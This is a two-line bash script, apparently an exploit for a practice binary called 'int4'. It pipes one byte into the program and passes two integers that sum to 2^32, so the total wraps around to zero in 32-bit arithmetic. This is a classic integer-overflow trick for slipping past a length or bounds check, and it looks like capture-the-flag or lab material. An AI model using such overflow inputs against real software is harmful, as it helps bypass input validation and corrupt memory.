#!/bin/bash
python3 -c 'import sys; sys.stdout.buffer.write(b"\x03")' | ./int4 1076 $((2**32 - 1076))
